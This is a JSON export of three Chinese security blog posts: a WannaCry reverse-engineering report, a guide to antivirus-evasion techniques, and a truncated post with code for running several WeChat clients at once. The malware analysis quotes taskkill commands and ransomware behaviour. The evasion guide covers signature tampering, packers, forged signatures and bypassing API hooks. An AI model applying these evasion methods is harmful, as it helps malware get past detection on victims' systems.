[{"title":"WannaCry深度详细分析报告","date":"2017-05-26T01:29:07.000Z","path":"wannacry-analyze-report/","text":"0x00. 前言最近，WannaCry是火了一把，到处都是分析文章，报告，解决方案等等。 趁着这个热度，我也来跟风一把。 前前后后把WannaCry详细分析了一遍。 从文件释放、启动加密器、文件加密策略、加密算法、到解密过程中所有细节进行了详尽深入的分析。 由于没有拿到初始样本，没有包含漏洞利用部分的分析。 样本信息： MD5: 84C82835A5D21BBCF75A61706D8AB549 SHA1: 5FF465AFAABCBF0150D1A3AB2C2E74F3A4426467 CRC32: 4022FCAA 无壳 / Visual C++ 6.0 下面具体看分析内容。 0x01. 概述 样本首先通过资源释放各种文件，包括加密器、解密器、几个辅助程序、桌面背景图、说明文件、语言文件等等。 内存加载加密器模块，执行加密部分功能。 枚举目标文件（目标文件后缀列表后面给出），加密为.WNCRY文件（加密策略后面详述），删除原始文件。 复制自身为tasksche.exe，安装启动项 启动解密器 大致流程图如图： 下面开始详细分析各个部分细节。 0x02. 释放文件设置当前目录为工作目录，然后查找PE中资源(XIA)。 直接用资源工具看一下，发现是PK开头的，多半是个压缩文件了，导出来试试。 解压还要密码，看代码密码是WNcry@2ol7，解压成功。 读取资源数据后，解压释放文件到当前目录。 123456789101112//部分释放文件说明：b.wnry //桌面背景图片c.wnry //加密相关msg/*.wnry //语言相关文件r.wnry //@Please_Read_Me@.txts.wnry //是压缩文件，打包的是Tor相关组件taskdl.exe //删除回收站文件taskse.exe //用于启动其他session的@WanaDecryptor@.exeu.wnry //@WanaDecryptor@.exe 解密器 t.wnry //解密后是加密器 在三个比特币交易地址中随机选择一个，写入c.wnry 然后设置当前目录为隐藏属性，且设置为everyone可访问 然后初始化Crypt相关函数，用于后面的解密操作。 开始操作文件t.wnry，看看内容，应该是个加密文件。 然后通过crypt API将t.wnry解密之后（解密后是个DLL模块，dump数据后可以用于分析），映射到内存（自己loaddll），然后找到导出接口函数TaskStart调用，开始加密工作。 0x03. 加密部分TaskStart一进来，通过MsWinZonesCacheCounterMutexA的Mutex进行单示例检查，有则退出，没有继续工作。 然后是设置工作目录，读取c.wnry信息。 检查是否是SYSTEM账户。 初始化Crypt相关函数，以及文件操作函数（增加一点分析成本）。 检查Global\\MsWinZonesCacheCounterMutexW，Global\\MsWinZonesCacheCounterMutexA\\0是否存在， 存在则表示加密相关准备工作已经完成，不在进行，没有则创建Global\\MsWinZonesCacheCounterMutexA\\0 检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则加密相关准备工作已经完成，不在进行，没有则进行后续工作。 如果加密相关准备工作已经完成，创建一个线程，完成如下工作（记为工作A）： a). 如果不是管理员权限，并且不是SYSTEM账户，通过taskse.exe提权启动@WanaDecryptor@.exe，是则普通方式启动@WanaDecryptor@.exe b). 安装tasksche.exe启动项（注册表Run），键名随机 如果加密准备未完成，初始化密钥，保存到00000000.pky, 00000000.eky。 由于时间关系，具体加密密钥产生过程不再详述，很多分析文章说的很清楚了，本文重点不在此。 然后是如果00000000.res不存在，通过CryptGenRandom产生8字节随机值，后续会写入00000000.res 接着创建5个工作线程，完成不同的工作。 a). 线程1每隔25秒循环写入数据到00000000.res，包括前面CryptGenRandom生成的随机值，已经更新的当前时间，直到线程退出标记为真退出 b). 线程2每5秒检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则设置全局标志，然后退出线程 c). 线程3监测新增磁盘，加密新磁盘的文件（和其他磁盘加密相同） d). 线程4每30秒启动taskdl.exe清除所有磁盘的回收站文件 e). 线程5完成的也是前面提到的工作A的内容，不再详述 然后就是重点了，加密文件部分了。 加密文件部分拷贝u.wnry为@WanaDecryptor@.exe，通过写一个bat创建@WanaDecryptor@.exe.lnk快捷方式。 读取r.wnry内容，生成@Please_Read_Me@.txt文件。 枚举当前用户桌面和文档目录文件，进行加密（没有设置不复写标记，删除前会复写）。 枚举All Users\\Desktop和All Users\\Documents，找到非当前用户目录进行加密（没有设置不复写标记，删除前会复写）。 下面记为工作B: 通过taskkill强删Microsoft.Exchange、sql和mysql进程（加密其数据） anhkgg_CreateProc_10001080(aTaskkill_exeFI, 0, 0);// taskkill.exe /f /im Microsoft.Exchange.anhkgg_CreateProc_10001080(aTaskkill_exe_0, 0, 0);// taskkill.exe /f /im MSExchangeanhkgg_CreateProc_10001080(aTaskkill_exe_1, 0, 0);// ‘taskkill.exe /f /im sqlserver.exeanhkgg_CreateProc_10001080(aTaskkill_exe_2, 0, 0);// taskkill.exe /f /im sqlwriter.exeanhkgg_CreateProc_10001080(aTaskkill_exe_3, 0, 0);// taskkill.exe /f /im mysqld.exe 加密磁盘中文件，每个分区重复两次（会设置不复写标记，删除前不会复写）。 枚举All Users\\Desktop目录，复制b.wnry到目录中为@WanaDecryptor@.bmp，设置桌面背景为@WanaDecryptor@.bmp， 执行@WanaDecryptor@.exe co 更新00000000.res cmd.exe /c start /b @WanaDecryptor@.exe vs 每个磁盘(fixed)创建x:/$Recycle/hibsys.WNCRYT（系统盘写在temp目录，x:/$Recycle被设置为系统隐藏属性），读取分区可用空间大小，大于0x40000000（1GB）的话，每10微秒循环写入0xa00000个字节的’U’，写20次，然后删除该文件，并且设置了重启后删除。 每隔60s重复工作B，直到退出标志为真。 文件枚举枚举文件采用方式为： 枚举当前目录中所有文件(排除文件看下文)，加入文件链表，记录所有子目录（排除目录看下文）到目录链表。 本目录文件有加密操作（具体看下文） 分析目录层级，少于等于6层的，拷贝lease_Read_Me@.txt到目录，5-6层的拷贝@WanaDecryptor@.exe.lnk，1-4层拷贝@WanaDecryptor@.exe到目录。 然后遍历目录链表，枚举子目录，重复1操作。 子目录枚举完成，所有文件记录到链表，进行后续操作。 目录和文件采用相同的链表结果，总结如下： 12345678910111213141516171819202122struct FILE_LIST_CONTEXT&#123; DWORD vtable; FILE_LIST *list;// DWORD file_count;//8&#125;struct FILE_LIST&#123; FILE_LIST* prev; FILE_LIST* next; FILE_INFO file;//8&#125;struct FILE_INFO&#123; WCHAR path[0x168];// WCHAR name[0x104];//2d0 DWORD nFileSizeLow;//4d8 DWORD nFileSizeHigh;//4dc DWORD type;//4e0 FILE_TYPE&#125;//0x4e4 排除目录枚举子目录时，会跳过如下目录（保证系统正常工作）： 12345678910\\Intel \\ProgramData\\WINDOWS\\Program Files\\Program Files (x86)\\AppData\\Local\\Temp\\Local Settings\\TempThis folder protects against ransomware. Modifying it will reduce protectionTemporary Internet FilesContent.IE5 文件分类枚举文件时，首先跳过 @Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk， @WanaDecryptor@.bmp 然后检查文件类型，跳过0,1,6类型文件，其他文件加入链表。 具体类型如下： 1234567891011121314151617180 没有后缀以及其他类型后缀1 .exe, .dll4 .WNCRYT 5 .WNCYR6 .WNCRY2.&quot;.doc&quot;&quot;.docx&quot;&quot;.xls&quot;&quot;.xlsx&quot;&quot;.ppt&quot;&quot;.pptx&quot;&quot;.pst&quot;&quot;.ost&quot;&quot;.msg&quot;&quot;.eml&quot;&quot;.vsd&quot;&quot;.vsdx&quot;&quot;.txt&quot;&quot;.csv&quot;&quot;.rtf&quot;&quot;.123&quot;&quot;.wks&quot;&quot;.wk1&quot;&quot;.pdf&quot;&quot;.dwg&quot;&quot;.onetoc2&quot;&quot;.snt&quot;&quot;.jpeg&quot;&quot;.jpg&quot;3. &quot;.docb&quot;&quot;.docm&quot;&quot;.dot&quot;&quot;.dotm&quot;&quot;.dotx&quot;&quot;.xlsm&quot;&quot;.xlsb&quot;&quot;.xlw&quot;&quot;.xlt&quot;&quot;.xlm&quot;&quot;.xlc&quot;&quot;.xltx&quot;&quot;.xltm&quot;&quot;.pptm&quot;&quot;.pot&quot;&quot;.pps&quot;&quot;.ppsm&quot;&quot;.ppsx&quot;&quot;.ppam&quot;&quot;.potx&quot;&quot;.potm&quot;&quot;.edb&quot;&quot;.hwp&quot;&quot;.602&quot;&quot;.sxi&quot;&quot;.sti&quot;&quot;.sldx&quot;&quot;.sldm&quot;&quot;.sldm&quot;&quot;.vdi&quot;&quot;.vmdk&quot;&quot;.vmx&quot;&quot;.gpg&quot;&quot;.aes&quot;&quot;.ARC&quot;&quot;.PAQ&quot;&quot;.bz2&quot;&quot;.tbk&quot;&quot;.bak&quot;&quot;.tar&quot;&quot;.tgz&quot;&quot;.gz&quot;&quot;.7z&quot;&quot;.rar&quot;&quot;.zip&quot;&quot;.backup&quot;&quot;.iso&quot;&quot;.vcd&quot;&quot;.bmp&quot;&quot;.png&quot;&quot;.gif&quot;&quot;.raw&quot;&quot;.cgm&quot;&quot;.tif&quot;&quot;.tiff&quot;&quot;.nef&quot;&quot;.psd&quot;&quot;.ai&quot;&quot;.svg&quot;&quot;.djvu&quot;&quot;.m4u&quot;&quot;.m3u&quot;&quot;.mid&quot;&quot;.wma&quot;&quot;.flv&quot;&quot;.3g2&quot;&quot;.mkv&quot;&quot;.3gp&quot;&quot;.mp4&quot;&quot;.mov&quot;&quot;.avi&quot;&quot;.asf&quot;&quot;.mpeg&quot;&quot;.vob&quot;&quot;.mpg&quot;&quot;.wmv&quot;&quot;.fla&quot;&quot;.swf&quot;&quot;.wav&quot;&quot;.mp3&quot;&quot;.sh&quot;&quot;.class&quot;&quot;.jar&quot;&quot;.java&quot;&quot;.rb&quot;&quot;.asp&quot;&quot;.php&quot;&quot;.jsp&quot;&quot;.brd&quot;&quot;.sch&quot;&quot;.dch&quot;&quot;.dip&quot;&quot;.pl&quot;&quot;.vb&quot;&quot;.vbs&quot;&quot;.ps1&quot;&quot;.bat&quot;&quot;.cmd&quot;&quot;.js&quot;&quot;.asm&quot;&quot;.h&quot;&quot;.pas&quot;&quot;.cpp&quot;&quot;.c&quot;&quot;.cs&quot;&quot;.suo&quot;&quot;.sln&quot;&quot;.ldf&quot;&quot;.mdf&quot;&quot;.ibd&quot;&quot;.myi&quot;&quot;.myd&quot;&quot;.frm&quot;&quot;.odb&quot;&quot;.dbf&quot;&quot;.db&quot;&quot;.mdb&quot;&quot;.accdb&quot;&quot;.sql&quot;&quot;.sqlitedb&quot;&quot;.sqlite3&quot;&quot;.asc&quot;&quot;.lay6&quot;&quot;.lay&quot;&quot;.mml&quot;&quot;.sxm&quot;&quot;.otg&quot;&quot;.odg&quot;&quot;.uop&quot;&quot;.std&quot;&quot;.sxd&quot;&quot;.otp&quot;&quot;.odp&quot;&quot;.wb2&quot;&quot;.slk&quot;&quot;.dif&quot;&quot;.stc&quot;&quot;.sxc&quot;&quot;.ots&quot;&quot;.ods&quot;&quot;.3dm&quot;&quot;.max&quot;&quot;.3ds&quot;&quot;.uot&quot;&quot;.stw&quot;&quot;.sxw&quot;&quot;.ott&quot;&quot;.odt&quot;&quot;.pem&quot;&quot;.p12&quot;&quot;.csr&quot;&quot;.crt&quot;&quot;.key&quot;&quot;.pfx&quot;&quot;.der&quot; 总结为下面的enum 12345678910enum FILE_TYPE&#123; FILE_TYPE_NULL = 0, FILE_TYPE_EXEDLL, FILE_TYPE_DOC, FILE_TYPE_DOCEX, FILE_TYPE_WNCRYT, //.wncryt FILE_TYPE_WNCYR, //.wncyr FILE_TYPE_WNCRY //.wncry&#125; 文件加密策略加密文件函数中有个参数，我取做cmd（取值是1-4）。因为不同的值会有不同的操作方式。 根据cmd和文件类型和大小等等，函数sub_10002E70返回不同的操作方式。 123456789101112131415161718191. cmd&gt;=4, FOT_ENCRYPT_NORMAL_42. cmd&lt;=3，FILE_TYPE_NULL，FOT_NULL_1 3. cmd==3, 非FILE_TYPE_NULL，FOT_ENCRYPT_NORMAL_44. cmd&lt;=2, .wncyr, FOT_NULL_15. cmd&lt;=2, .wncryt, FOT_DELETE_FILE_2//用于枚举中的操作，直接操作普通文件（不加入链表）和大文件.doc（加入链表），小文件.doc,.docex加入链表，其他文件不加入链表//枚举中完成加密操作的文件不加入链表了6. cmd==1, .doc, 大文件, FOT_ENCRYPT_WRITESRC_3 //也要加入链表7. cmd==1, .doc, 普通文件, FOT_ENCRYPT_NORMAL_48. cmd==1, .doc, 小文件，FOT_NULL_19. cmd==1, .docex, FOT_NULL_110. cmd==2, .doc, FOT_NULL_111. cmd==2, .docex, 大文件， FOT_ENCRYPT_WRITESRC_312. cmd==2, .docex, 小文件，FOT_NULL_113. cmd==2, .docex, 普通文件，FOT_ENCRYPT_NORMAL_4其他返回FOT_NULL_0 上面提到的大文件，普通文件，小文件定义如下： 1小于0x400的是小文件，大于0xC800000的是大文件，中间的是普通文件 上面提到的作方式具体定义如下：12345678//返回0表示未作处理，或者处理未完成，需要插入链表或者不从链表中删除enum FILE_OP_TYPE&#123; FOT_NULL_0 = 0, //0 未操作，返回1 FOT_NULL_1, //1,default 未操作，返回0 FOT_DELETE_FILE_2, //2 //删除文件，返回1 FOT_ENCRYPT_WRITESRC_3, //3 改源文件，返回0 FOT_ENCRYPT_NORMAL_4, //4 只加密，返回1&#125; 代码如下： 对加密策略做一下总结：a). 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理。 b). 枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件。 cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR。 cmd=2, 删除.WNCRYT cmd=3, 加密链表中所有文件（移出链表） cmd=4, 加密可能剩余链表中的文件 文件内容加密过程验证文件是否未加密，或者未加密完成。已完成加密，直接退出。 对于FOT_ENCRYPT_WRITESRC_3，按写打开源文件，将文件头0x10000字节内容移动到尾部，头部内容清零，写入加密文件头部数据，然后源文件移动为.WNCYR，完成退出。 对于FOT_ENCRYPT_NORMAL_4，按读打开源文件，对于普通文件进行随机值检查，满足100倍数，且文件数据小于10，那么换本次加密算法为免费解密的算法，标记，加密完成后调用回调函数写入f.wnry中。 加密前，将文件后缀加上T变成.WNCRYT，然后创建文件。 写入加密文件头部数据 12345678910//加密文件头部数据结构struct &#123; char magic[8];//WANACRY!&apos; int size;//0x100 char key[size];// int type;//加密文件类型3,4 __int64 datasize;// &lt;=0x6400000 源文件大小 char data[1];//&#125; 对于.WNCYR文件（FOT_ENCRYPT_WRITESRC_3处理过一次），读取尾部0x10000的数据加密写入文件。 然后每0x1000读取加密，写入.WNCRYT文件，循环直到所有数据加密。移动.WNCRYT为.WNCRT。 对于FOT_ENCRYPT_NORMAL_4，加密完成后会将源文件加入删除链表，在删除线程中文件会被复写删除。 复写通过生成随机值或者一片’U’，循环写入文件，细节不再阐述（桌面我的文档目录文件目录会被复写，其他目录文件不会）。 总结至此，wannacry大部分内容都分析完成，由于时间精力的关系，后续解密器就不再分析了。最后说一句，现在这个时代不再适合裸奔！！！ 转载请注明出处：https://anhkgg.github.io/wannacry-analyze-report","tags":[{"name":"wannacry","slug":"wannacry","permalink":"https://anhkgg.github.io/tags/wannacry/"},{"name":"比特币病毒","slug":"比特币病毒","permalink":"https://anhkgg.github.io/tags/比特币病毒/"},{"name":"逆向分析","slug":"逆向分析","permalink":"https://anhkgg.github.io/tags/逆向分析/"},{"name":"样本分析","slug":"样本分析","permalink":"https://anhkgg.github.io/tags/样本分析/"},{"name":"locky","slug":"locky","permalink":"https://anhkgg.github.io/tags/locky/"}]},{"title":"免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)","date":"2017-05-22T00:07:45.000Z","path":"aanti-virus/","text":"00. 概述什么是免杀？来自百科的注解： 免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。 有本比较有名的书，想详细学习的同学可以去看看。《黑客免杀攻防》 其实我大概好像只看过目录…( ╯□╰ ) 下面我介绍的是自己实践的一些方法，有没有效果，试试就知道了。 01. 简介免杀大概可以分为两种情况： 二进制的免杀（无源码），只能通过通过修改asm代码／二进制数据／其他数据来完成免杀。 有源码的免杀，可以通过修改源代码来完成免杀，也可以结合二进制免杀的技术。 免杀也可以分为这两种情况： 静态文件免杀，被杀毒软件病毒库/云查杀了，也就是文件特征码在病毒库了。免杀方式可能是上面的两种方式，看情况。 动态行为免杀，运行中执行的某些行为被杀毒软件拦截报读。行为免杀如果没有源码就不是很好搞了。 下面就静态和动态免杀来详细说说免杀的技术。 02. 静态免杀对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。 杀毒是提取文件一段特征码来识别病毒文件。 能识别一个程序是一个病毒的一段不大于64字节的特征串 那杀毒软件是怎么提取文件特征码的？ 如果我们知道了一个文件是病毒，那么通过md5肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接md5肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做模糊哈希（Fuzzy Hashing）算法的东西。 模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。 大致就可以理解为，不要把一个文件的所有内容都拿来计算hash，而通过分片，取出部分重要（不易改变）的内容进行hash计算，这样就能达到通过一个特征码找到类似的病毒变种。 关于模糊哈希更加详细的内容可以查看文章后面的参考文章，这里不再详述。 具体杀毒软件是不是通过这个算法来计算特征码的，我也不能完全肯定（纯猜测加网上一点点信息），但是根据免杀的经验可以总结出几点： 特征码会有多个串组合（减少误报） 代码数据（肯定有） 会解析PE，检查附加文件数据、PE文件的资源等等 1. 怎么找特征码工具查找常见的特征码定位工具有CCL、MYCCL。工具大致原理就是分割文件，某些分割部分填入数据(0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之前局别是使用的分割算法不同，查找特征码的效果不同。 目前比较常有名气的特征码定位器主要有CCL与MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。 后来出来了一款新的特征码定位软件VirTest。下面是作者自己的介绍： 我们可以这样假设报毒过程，如果检测文件是PE,如果在CODE位置存在 标志A,在DATA位置存在标志B,在资源位置存在标志C,同时满足这个3个条件，那么杀软就会报毒,VIRTEST工作原理就是要找到引起报毒最后一个标志，也就是假设中的标志C。 因此VIRTEST采用2分排除法，测试标志C所在文件中的位置，由于被杀的文件可能存在多个 类似于ABC这样的连锁条件，所以我们必须要通过一种排除机制，先要找最靠近文件前部的连锁条件，排除掉文件尾部数据，当找到第一个连锁条件后，抹掉引标志C，再恢复尾部数据， 然后继续测试另外的连锁条件，直到找到最后一个连锁条件，抹掉后，整个文件免杀了，则说明特征代码被定为完毕了，所以VIRTEST绝对可以精确的定位出所有的复合特征。这比文件分块定位法先进得多，更为科学。 工具查找肯定是针对二进制文件（有源码的也编译后在检查）。 具体用过MYCCL（使用方法自行查找），确实比手工分割文件定位方便，也可以找到某些文件的特征码，但是有些时候可能会出现非常多非常多…的被杀文件分割，然后…崩溃了。 后来也用了virtest，感觉作者说的挺有道理，应该挺好用吧。然后试了试，确实感觉比MYCCL高大上多了，也可以定位到特征码，但是tmd改了之后怎么还是报呢，反正你可能会折腾很久… 手工查找这里说的是针对有源码的（二进制就别想手工了…），方法非常简单。 mian中屏蔽所有代码，编译，扫描。不报的话继续2，如果依然报毒，去5。 放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复2。直到定位到某个函数或者多个函数，进入3。 在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复2。 直到定位某段代码（无自定义内部调用），特征码在此。 是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从1开始。如果没有，那去找找PE头吧。 大致流程： 123456781. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报...直到找到某API调用，或者逻辑代码（没有自定义函数调用） 此方法，虽然笨，但是定位特征码不会很慢，挺准确。 其他别找了，直接盲免杀吧（后面具体看，有效） 2. 怎么免杀？前面已经找到特征码了，怎么免杀呢？ 其实前面已经说到了，找到特征码之后，只要改变这个特征码值得话就免杀成功。如果不需要软件正常运行，直接填零得了…开玩笑，这怎么可能。所以修改特征码还得保证软件正常功能。所以也是有讲究的。 常用的修改工具有，OD，C32ASM，UE，010Editor等等。 手工修改非源码1. 数据 如果特征码定位到数据（通过IDA/OD等确认），其实不好修改，稍微不慎就会导致程序不能运行，或者影响程序运行流程或结果。 字符串，如果不影响程序逻辑，可以替换大小写；如果无关紧要的数据，随意替换；等等，看情况而定。 整数，如果不影响结果，替换值，清零等等操作。 地址，基本应该不能修改，具体看情况。 PE头数据，根据PE结构具体来看，无用数据清零或修改，有用数据看情况修改。 最后，终极修改方法，找到访问数据的代码，直接修改代码访问数据的地址，数据也可以放到其他地址了，其实就如同修改源码一样修改，肯定没有修改源码那么容易（见后）。 反正特征码定位到数据位置不容易修改（可以再试试后面的盲免杀）。 2. 代码 如果特征码定位到代码（也通过IDA/OD等确认），在不改变程序功能基础上，应用各种方法修改。 等价替换汇编代码，如mov eax，0可以换成xor eax，eax，直接结果相同，二进制代码不同。 交换代码顺序，在不影响逻辑的情况下。 代码块移位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址。 源码在有源码的情况下，修改的方式就更灵活了，更简单了。 如果特征码是数据，那么修改数据位置，访问数据的代码位置等（思想类比非源码方式）。 加花指令，这是最有效也是最常用的方式，要点在于如何加话指令。 加数据计算代码，加减乘除各类组合。 加字符串操作代码，增加、删除、查找、替换等。 加多层跳转，跳转间加无效指令（不会执行的）。 加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等。 等等。 工具免杀（盲免杀）在没找到有效的特征码，或者不好修改的时候，可以试试这种方式。 资源操作1. 加资源 使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。 2. 替换资源 使用ResHacker替换无用的资源（Version等）。 3. 加签名 使用签名伪造工具，将正常软件的签名信息加入到自己软件中。 几种方式可以交替重复多次进行组合使用。 PE操作1. PE优化 使用PE优化工具对文件进行优化，删除0，PE头优化，附加数据等。 2. 增加节 增加节数据，随意加入无效数据。 加壳可以将加壳简单理解为：解密器/解压器+加密器/压缩器（原始代码）。 通过加密器/压缩器将原始代码进行加密压缩，让其特征码变化隐藏，然后组装上解密器/解压器到文件中，运行是先运行解密/解压器，将加密压缩内容解密解压，然后继续运行原始代码。 1. 加冷门壳 壳也有特征，知名壳都已经被分析的非常多了，杀软基本都能查这类壳，或者自动脱壳，然后进行查杀。 所以加冷门壳，壳特征未被分析，不能自动脱壳，可以更好隐藏原始代码，得到免杀效果。 2. 加壳改壳 将常用壳进行修改，让壳特征变化，也可以是杀软失效。 比如修改入口，区段信息修改，入口代码移位。 可以类比为免杀壳，上面介绍的方法都可以使用。 03. 行为动态免杀杀毒软件现在都会有主防的功能，对恶意行为进行拦截提示。 比如这些行为： 注册表操作，添加启动项，添加服务 文件写入、读系统文件、删除文件，移动文件 杀进程，创建进程 注入、劫持等 行为拦截原理说白了，恶意行为都是通过API调用来完成的，可能是一个API，可能是多个APi组合。 杀软通过技术手段拦截这些API调用，通过策略来判断是否属于恶意行为。 关键点： API 策略（顺序，调用源，参数等等） 所以后面的方法就是针对这两点做的工作。 如何进行行为免杀呢？下面介绍的方式对非源码、源码都有效，但是非源码修改起来非常非常麻烦… 1. 替换api 使用相同功能的API进行替换，杀软不可能拦截了所有API，所以这种方式还是有效的。比如MoveFileEx替换MoveFile。 2. 未导出api 寻找相同功能的未导出API进行替换，杀软拦截一般是导出API，或者底层调用，寻找未导出API有一定效果。 寻找方法，通过分析目标API内部调用，找到内部一个或多个未导出API，来完成相同功能。 3. 重写api 完全重写系统API功能（通过逆向），实现自己的对应功能API，对于ring3的行为拦截非常有效。比如实现MoveFile等。 4. api+5 ring3的API拦截通过是挂钩API头几个字节内容，然后进入杀软自己函数进行参数检查之类的。 那么如果调用API时，跳过头部几字节，就可以避开这种拦截方式。 12345__API:1 push ebp;2 mov ebp, esp;3 mov edi, edi;4 ... 调用时，不适用1地址，而使用4地址，然后自己函数内部还原跳过几字节的调用。 12345__API_MY:push ebp;mov ebp, esp;mov edi, edi;call 4 5. 底层api 该方法类似于2和3，杀软拦截API可能更加高层（语义更清楚），那就可以找更底层API进行调用，绕过拦截，比如使用NT函数。 或者通过DeviceIoControl调用驱动功能来完成API功能。 模拟系统调用。 6. 合理替换调用顺序 有时拦截行为是通过多个API组合来完成的，所以合理替换顺序，绕过杀软拦截策略，也可以绕过改行为拦截。 比如，先创建服务，再将服务对应文件拷贝过去。 7. 绕过调用源 通过调用其它进行功能来完成API的功能。比较经典的如，通过rundll32.exe来完成dll加载，通过COM来操作文件等等。 总结方法大概就总结到这，要更好的完成免杀，需要各种方式进行合理灵活组合变化，或者挖掘更多的方法。 注意/技巧 非源码修改时，通过OD能够更好的完成，配合IDA进行观察，具体参考OD/IDA使用教程。 源码免杀加花，要灵活多变，不拘于形式。 行为免杀多尝试，猜出杀软拦截策略，能够更有效的找到绕过方式。 道高一尺，魔高一丈 各路大神有更多的技巧和方式，请不吝赐教，相互交流。 我们不做坏事，但是可以了解做坏事的手段，更好的破坏防御这些手段。 参考 模糊哈希算法的原理与应用 VirTest5.0特征码定位器（开源） http://baike.baidu.com/link?url=ExY1OF52Md1Lk6G_WMZQf4fdswE2RSjuhPmXEYRwgVhkSIb-udf0AhK1cqbhmnDsnf21pUJSvHEWnMoxwZfZ5asnxw0W76Ew9t5ZIJRbLxO 转载请注明出处：https://anhkgg.github.io/aanti-virus","tags":[{"name":"Anti-AntiVirus","slug":"Anti-AntiVirus","permalink":"https://anhkgg.github.io/tags/Anti-AntiVirus/"},{"name":"免杀","slug":"免杀","permalink":"https://anhkgg.github.io/tags/免杀/"},{"name":"AntiVirus","slug":"AntiVirus","permalink":"https://anhkgg.github.io/tags/AntiVirus/"},{"name":"杀毒软件","slug":"杀毒软件","permalink":"https://anhkgg.github.io/tags/杀毒软件/"}]},{"title":"微信(WeChat)电脑端多开研究+源码","date":"2017-05-14T07:07:51.000Z","path":"wechat-multi-pc/","text":"0x00 前言不知道大家有没有多个微信号，我反正有一两三个。 现在电脑端微信使用频率也比较高，主要用于大文件传输，或者手机电脑文件互传等等，除了不能收红包和看朋友圈，貌似电脑端没其他毛病。 哦，还有个毛病，只能开一个微信，只能开一个，开一个，一个… 不管这些有的没的，今天的主题是，怎么样在电脑上开多个微信客户端！ 0x01 分析了解过单实例的同学，应该都知道大概是怎么实现的单开。 简单说下，大都通过判断Mutex、Event、File等等是否已经存在，存在则退出当前开启进程（说明已经有一个进程了），这样也就是单实例了。 那只要找到微信是通过什么标志来实现单实例的，然后干掉这个标志即可。 然后…基于这个思路，我们上工具。 使用procexp找到微信进程，然后翻了一遍句柄。 找到疑是的一段句柄。 12\\Sessions\\1\\BaseNamedObjects\\_WeChat_App_Instance_Identity_Mutex_Name\\Sessions\\1\\BaseNamedObjects\\WeChat_GlobalConfig_Multi_Process_Mutex 感觉这两个都像，不管了，上pchunter，kill掉句柄试一下。 经过尝试，发现_WeChat_App_Instance_Identity_Mutex_Name是单实例标志（kill句柄后可以开第二个客户端），WeChat_GlobalConfig_Multi_Process_Mutex没用。 既然如此，那开始码代码吧。 0x02 代码可能的方案： 找微信判断标识的代码位置，然后直接patch掉，或者整个dll进去patch。然后大致去翻了一下，貌似代码在wechatwin.dll，然后加了vmp壳，所以就不折腾这个了。 直接通过代码kill掉这个Mutex的句柄（类似Pchunter操作），然后就可以开启第二个实例了，貌似明显更有优势啊。 额，如果觉得无所谓，每次开之前用pchunter关一次句柄也行，下面就不用看了… 这里选择第二个方案，开始代码。 流程： 枚举句柄，找到_WeChat_App_Instance_Identity_Mutex_Name的mutant duplicate句柄到本进程，然后close 启动微信 下面是主要代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//步骤1和2的代码//获取到微信所有进程句柄DWORD Num = GetProcIds(L&quot;WeChat.exe&quot;, Pids);...Status = ZwQuerySystemInformation(SystemHandleInformation, pbuffer, 0x1000, &amp;dwSize);PSYSTEM_HANDLE_INFORMATION1 pHandleInfo = (PSYSTEM_HANDLE_INFORMATION1)pbuffer; for(nIndex = 0; nIndex &lt; pHandleInfo-&gt;NumberOfHandles; nIndex++) &#123; //句柄在Pids中，就是微信进程的句柄信息 if(IsTargetPid(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, Pids, Num)) &#123; HANDLE hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, (HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue, DUPLICATE_SAME_ACCESS ); //对象名 Status = NtQueryObject(hHandle, ObjectNameInformation, szName, 512, &amp;dwFlags); //对象类型名 Status = NtQueryObject(hHandle, ObjectTypeInformation, szType, 128, &amp;dwFlags); //找到微信的标志 if (0 == wcscmp(TypName, L&quot;Mutant&quot;)) &#123; if (wcsstr(Name, L&quot;_WeChat_App_Instance_Identity_Mutex_Name&quot;)) &#123; //DUPLICATE_CLOSE_SOURCE标志很重要，不明白的查一查 hHandle = DuplicateHandleEx(pHandleInfo-&gt;Handles[nIndex].UniqueProcessId, (HANDLE)pHandleInfo-&gt;Handles[nIndex].HandleValue, DUPLICATE_CLOSE_SOURCE ); if(hHandle) &#123; printf(&quot;+ Patch wechat success!\\n&quot;); CloseHandle(hHandle); &#125; &#125; &#125; &#125; &#125;&#125; 1234567891011121314151617181920步骤3的代码//通过注册表找到微信安装目录if(ERROR_SUCCESS != RegOpenKey(HKEY_CURRENT_USER, L&quot;Software\\\\Tencent\\\\WeChat&quot;, &amp;hKey))&#123; return;&#125;DWORD Type = REG_SZ;WCHAR Path[MAX_PATH] = &#123;0&#125;;DWORD cbData = 